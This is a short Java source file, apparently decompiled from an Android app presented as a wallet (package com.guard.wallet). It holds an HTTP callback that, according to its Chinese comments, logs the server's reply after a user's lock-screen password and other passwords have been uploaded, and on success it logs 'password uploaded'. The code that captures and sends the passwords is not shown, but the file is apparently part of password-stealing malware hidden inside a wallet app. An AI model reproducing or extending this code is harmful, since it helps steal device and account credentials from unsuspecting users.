package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.resp.ApiResult;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 上传密码回调 — vendor http/c0.
 *
 * <p>上传锁屏密码/其他密码完成后记录日志。
 */
public final class UploadCipherCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("UploadLockCipherCallback", e);
        if (!(e instanceof DuplicateRequestException)) { HttpClient.finishRequest(call.request().url().host()); }
    }
    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody var3 = response.body();
        if (var3 != null) {
            try {
                UploadCipherCallback$1 var6 = new UploadCipherCallback$1();
                ApiResult var7 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var3.string(), var6);
                if (var7 != null && var7.getSuccess() && (Boolean) var7.getData()) {
                    Log.d("UploadLockCipherCallback", "密码上传成功");
                }
            } catch (Exception var8) { AppUtils.s("UploadLockCipherCallback", var8); }
        }
        response.close();
    }
}
